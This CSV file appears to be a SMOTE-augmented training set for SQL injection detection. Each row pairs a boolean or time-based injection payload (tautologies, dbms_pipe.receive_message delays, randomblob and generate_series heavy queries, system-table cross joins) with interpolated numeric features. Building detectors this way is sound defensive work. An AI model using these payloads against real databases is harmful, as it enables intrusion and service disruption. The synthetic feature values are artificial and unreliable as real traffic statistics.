id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001507,attack,boolean,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",nearest_attack_euclidean,R000109,1.5218684887660427,87.66037018779261,22.0,3.112115481533534,15.91273136737038,14.252361179577774,43.49527764084445,14.0,0.1806132518271465,0.163693903733652,0.4956564592451192,0.16003638519408228,0.0,4.0,0.4174537265259246,-1.3877787807814457e-17,1.0,1.4174537265259246,0.0,7.16509254694815,0.0,0.0,0.0,2.834907453051849,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5825462734740754,0.41745372652592455,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001508,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240",nearest_attack_euclidean,R000007,0.43938367121219096,92.785061997488,27.892530998743997,3.6941434933684456,31.892530998743997,15.677592996231988,35.0,10.214938002512007,0.34371775953722983,0.16890643467916427,0.3772329942204798,0.11014281156312616,0.0,0.0,0.21493800251200734,-1.3877787807814457e-17,1.0,1.0,0.0,6.0,0.0,1.0,1.0,2.2149380025120076,0.0,0.0,0.10746900125600367,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.8925309987439963,0.10746900125600367,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001509,attack,boolean,"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",nearest_attack_euclidean,R000004,1.3694689707273413,65.59260026251545,9.728400175010297,1.7739183489769383,5.555560157509262,2.07408021001236,44.96295989499382,13.0,0.08132476371042369,0.026590771923235362,0.6925939888703501,0.19949047549599086,0.6913600700041194,3.3086399299958806,0.17284001750102995,-1.3877787807814457e-17,0.0,1.1728400175010298,0.0,7.65431996499794,0.0,0.0,0.0,1.3456800350020597,0.1728400175010299,0.8271599824989702,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.17284001750102995,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1728400175010298
SMOTE_001510,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000078,0.7746301630497174,156.92421646701317,35.0,4.250160858645669,77.86086502446292,16.73416213936244,44.595027163825364,17.73416213936244,0.49603828265542266,0.1068220893161193,0.28393911354378354,0.11320051448467448,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,5.265837860637561,0.0,0.0,2.7341621393624393,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.265837860637561,0.7341621393624391,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001511,attack,boolean,"1%'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000069,1.0832488089983994,131.60083404552321,31.257202431823085,3.5024844883752912,35.0,15.0,59.08642918187704,22.514404863646174,0.26650367563857214,0.1142158609879595,0.4481412977954974,0.17113916557797093,4.971190272707655,1.028809727292346,0.0,1.0,0.0,2.0,0.0,10.514404863646174,2.0,0.0,1.0,3.0,1.0,0.25720243182308644,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001512,attack,boolean,1'   )    )     )   and 4069  =  8786 and    (    (     (  'eftr'  =  'eftr,nearest_attack_euclidean,R000125,0.1471936384979605,75.64433179919706,19.11370561162301,2.8950333588962716,13.962098129458997,9.151607482164014,40.30321496432803,12.227411223246019,0.1849473499305313,0.12080747463326486,0.5328938913560464,0.1613512840801575,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,6.075803741082007,0.07580374108200671,0.03790187054100347,0.03790187054100347,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001513,attack,boolean,"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""zbwn"" like ""zbwn",nearest_attack_euclidean,R000068,2.3817526343982456,131.7638140025501,32.76381400255011,3.7361541132808633,44.13651166879176,14.627302333758353,53.62730233375835,19.37269766624165,0.3347223134037308,0.11098421774051817,0.40711360521139883,0.14717986364435218,1.2546046675167055,3.6273023337583528,0.0,0.6273023337583528,0.0,1.0,0.0,10.372697666241647,0.3726976662416473,0.3726976662416473,1.7453953324832945,1.6273023337583528,0.6273023337583529,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.6273023337583528,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.37269766624164713,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001514,attack,boolean,"1  )   as wxms where 7272  =  7272 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000051,0.34994111979293324,158.19552365256723,32.44832136971271,4.065546201712376,83.0,16.0,43.89664273942542,15.298880913141806,0.5248319450622243,0.10117242314452517,0.27733508562167153,0.09666054617157906,0.14944045657090332,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,5.149440456570903,0.0,0.0,2.0,5.0,0.14944045657090338,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001515,attack,boolean,"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""rzja"" like ""rzja",nearest_attack_euclidean,R000097,0.4113529278007445,119.47228038930376,31.65134901921431,3.7918148181784055,44.77972156725009,13.261488235589265,45.95404705764294,15.47702352882147,0.3741760209145547,0.11226528465370539,0.38446999495286105,0.1290886994788788,0.0,3.6513490192143125,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,7.825674509607156,0.0,1.0,1.0,2.0,0.0,0.9128372548035781,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.9128372548035781,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.912837254803578
SMOTE_001516,attack,boolean,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000129,1.092220912955722,91.26764397308897,22.36617801345552,2.9891328153279213,11.169109932722407,14.098534040366557,48.0,18.0,0.12211095919810447,0.1546601159497061,0.5259846726197741,0.19724425223241532,4.0,0.0,0.3661780134555188,-1.3877787807814457e-17,0.0,2.0,0.0,8.0,2.0,0.6338219865444812,1.0,2.3661780134555186,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6338219865444812,0.36617801345551887,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001517,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000021,1.1403014397921867,134.2035507361057,32.601775368052856,4.255263378263746,72.59289852778858,9.0,35.80532610415856,16.80532610415856,0.5410520300188222,0.06706588935533549,0.2667328124102197,0.12514926821562256,0.0,0.6017753680528537,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,4.601775368052854,0.6017753680528538,0.0,3.0,4.0,0.0,0.6017753680528539,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001518,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,nearest_attack_euclidean,R000104,3.8024433525618213,150.69764719686856,31.83720589960857,3.7591595978300707,51.78138241851257,15.134882359843429,58.67441179921714,25.106970619295428,0.341211561314081,0.10135313808146386,0.39189682890930805,0.1655384716951471,0.0,3.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,12.702323539765143,1.0,1.567441179921714,3.5674411799217145,3.2697647196868562,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.5674411799217141,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.134882359843428,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.134882359843428
SMOTE_001519,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'ootz' like 'ootz",nearest_attack_euclidean,R000108,0.4609969658132802,130.566457515933,28.21677124203351,3.996731172144244,83.02452941084921,3.2167712420335093,30.891614378983245,13.433542484067019,0.6357294537165881,0.02468580033411015,0.23659561823963954,0.10298912770966225,3.0,0.0,0.0,-1.3877787807814457e-17,1.0,0.0,0.0,4.0,0.0,0.5419281050837729,2.2167712420335093,1.0,1.0,0.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001520,attack,boolean,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000129,1.202070418949502,91.19398767625975,22.403006161870127,2.9865808554526985,10.984969190649373,14.209018485610379,48.0,18.0,0.12018059489714555,0.15600336484115676,0.526411665644871,0.19740437461682664,4.0,0.0,0.40300616187012617,-1.3877787807814457e-17,0.0,2.0,0.0,8.0,2.0,0.5969938381298738,1.0,2.4030061618701257,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5969938381298738,0.40300616187012617,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001521,attack,boolean,"1'  )   where 7007  =  7007 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000149,2.2773088452635055,144.0806993307664,32.540349665383204,3.863780169636161,43.919300669233586,20.10759910768855,54.05379955384427,26.0,0.3053904822606221,0.13903991339276417,0.37503687807652764,0.18053272627008604,2.4596503346167937,0.0,1.0268997769221375,-1.3877787807814457e-17,0.0,2.0,0.0,10.513449888461068,0.0,2.0,1.0,9.026899776922138,1.0,0.0,0.5134498884610689,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.5134498884610688,0.0,0.4865501115389313,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001522,attack,boolean,1'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   'vvkd' like 'vvkd,nearest_attack_euclidean,R000154,0.6436173621141158,79.71600498336876,19.786000830561463,3.0781998370779116,17.144003322245837,12.14400332224584,38.42799833887708,12.0,0.21461336286440746,0.15182818178076035,0.4828740207540791,0.15068443460075306,4.0,0.0,0.0,-1.3877787807814457e-17,0.7860008305614603,1.2139991694385397,0.0,6.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001523,attack,boolean,"1'  )   as omtb where 1183  =  1183 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000127,0.4175075421775169,124.25818506556375,32.673409699793204,3.8317510514645465,41.80250223257508,20.129092532781875,47.21772686680453,15.108863433402266,0.3357873970768556,0.1613884395926174,0.380901795608649,0.121922367721878,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.8911365665977342,0.0,7.217726866804531,0.0,1.0,1.0,4.891136566597734,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.8911365665977342,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.891136566597734
SMOTE_001524,attack,boolean,"1  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000026,0.8000301011971143,105.4208066904237,32.19400209075741,3.6598711969058906,29.871602927060373,15.161199581848518,44.71040334521185,15.677600836302963,0.28281885152167724,0.1445347679632935,0.4238492807491334,0.1487970997658958,2.3223991636970367,0.0,1.8388004181514814,0.8388004181514817,0.0,1.0,0.0,8.516401254454445,0.0,0.16119958184851835,1.0,3.6776008363029633,1.0,0.0,0.8388004181514817,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.16119958184851846,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1611995818485183
SMOTE_001525,attack,boolean,"-5637%""   )    )     )   or 6872  =  6872 and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000041,2.4413618216668977,68.69569503095973,14.328550034399697,2.288026432965946,4.632855003439964,7.594260041279638,42.20286997936018,14.265710006879939,0.06725905756015854,0.1054758339066616,0.6196602374946085,0.20760487103857136,0.0,4.0,0.6328550034399697,-1.3877787807814457e-17,0.0,1.6328550034399698,0.0,6.73428999312006,1.2657100068799394,0.0,0.0,2.2657100068799396,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6328550034399697,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6328550034399696
SMOTE_001526,attack,boolean,"1""  )   where 2839  =  2839 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000083,0.3787539951039397,147.29889252549054,32.0,4.113423619895053,68.46389018767519,18.0,40.74222430028031,20.092778037535037,0.4648717155679461,0.12228681226631721,0.2763873735796791,0.13645409858605756,0.09277803753503888,0.9072219624649613,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,5.092778037535039,0.0,5.0,4.0,5.0,0.09277803753503872,0.9072219624649613,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.9072219624649613,0.09277803753503866,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001527,attack,boolean,"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""rzja"" like ""rzja",nearest_attack_euclidean,R000097,1.9717573796914607,111.33404431162101,30.76931280518704,3.7241522858993164,40.256793090872854,13.0,43.71816748049878,14.359083740249387,0.359115669292343,0.11839629644372666,0.3938623932696945,0.12862564099423573,0.410229064937653,2.359083740249387,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,7.589770935062347,0.0,1.0,1.0,2.0,0.4102290649376533,0.5897709350623468,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.5897709350623468,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.589770935062347
SMOTE_001528,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'vcgc' like 'vcgc",nearest_attack_euclidean,R000147,0.104203774516671,135.8659117376683,28.973182347533662,3.9915107578329936,84.0,3.0,34.892729390134654,13.973182347533664,0.6182792666162922,0.022081402379153292,0.256797501472829,0.1028418295317255,2.919547042600988,0.08045295739901148,0.0,-1.3877787807814457e-17,1.0,0.0,0.0,4.973182347533663,0.0,0.0,2.0,1.0,0.9731823475336627,0.02681765246633716,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001529,attack,boolean,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd",nearest_attack_euclidean,R000009,0.29784733162545257,143.4834049007137,31.24834049007137,3.883317329660592,47.0,16.0,53.98672392057097,26.49668098014274,0.32785120330968276,0.11160892027563668,0.37588610295258057,0.18465377346209993,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,10.496680980142742,0.0,2.0,1.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001530,attack,boolean,1  )   as azoo where 8933  =  8933 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R000044,1.4053716364164004,72.16136168164165,24.63227233632833,3.636682098861724,15.264544672656658,21.0,26.948408504492498,8.948408504492496,0.21078600603014613,0.2921686671593332,0.373737806473546,0.12330752033697469,0.6322723363283309,0.0,1.367727663671669,-1.3877787807814457e-17,1.0,2.0,0.0,3.3161361681641655,0.0,0.0,0.0,5.0,0.31613616816416545,0.0,0.6838638318358347,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.31613616816416534,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3161361681641655
SMOTE_001531,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""jkfk""  =  ""jkfk",nearest_attack_euclidean,R000124,0.508532465928887,123.38029555488981,31.0,4.328193091902882,78.98587852029384,4.507060739853079,25.760591109779618,14.12676518496327,0.640394851826362,0.036446463336067214,0.20867501081627615,0.11448367402129467,0.0,2.7464696300734603,0.25353036992653943,-1.3877787807814457e-17,1.0,1.0,0.0,2.2535303699265397,0.1267651849632697,0.0,2.87323481503673,2.2535303699265397,0.0,1.0,0.12676518496326977,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001532,attack,boolean,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000017,1.817758031614117,74.10925684371725,21.890743156282756,3.2372038394650455,8.37253368232988,16.0,34.21851368743449,15.518209473952874,0.11507935052511697,0.21625240360353468,0.45920162432481537,0.2094666215465329,0.0,4.0,1.0,-1.3877787807814457e-17,0.5182094739528741,2.0,0.0,5.036418947905748,2.0,0.48179052604712586,0.4817905260471259,3.518209473952874,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001533,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'vcgc' like 'vcgc",nearest_attack_euclidean,R000147,0.287930267390096,133.82724609083863,28.565449218167725,3.9895887309425193,84.0,3.0,33.2617968726709,13.565449218167725,0.6278912959345283,0.022424689140518858,0.24835264714323585,0.10133136778171697,3.0,0.0,0.0,-1.3877787807814457e-17,1.0,0.0,0.0,4.565449218167724,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001534,attack,boolean,"1%' or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000134,1.203186520169786,129.45354556312336,30.0,3.9872924321760124,71.37112879692694,8.0,34.71128796926946,15.371128796926946,0.5522446344311889,0.0619195115617526,0.26702780050813774,0.11880805349892075,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,4.742257593853892,0.6288712030730539,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.3711287969269461,0.6288712030730539,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001535,attack,boolean,"1' in boolean mode  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",nearest_attack_euclidean,R000091,2.381371767324216,119.97708416732308,33.0,3.746403825864026,40.73138088595,15.0,48.245703281373075,16.0,0.33779118328073365,0.1254736960491453,0.40289651155103273,0.13383860911908832,2.748567760457693,0.0,0.5028644790846146,1.0,0.0,1.0,0.0,9.0,0.0,0.0,1.0,2.5028644790846144,1.0,0.0,0.2514322395423073,0.7485677604576928,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
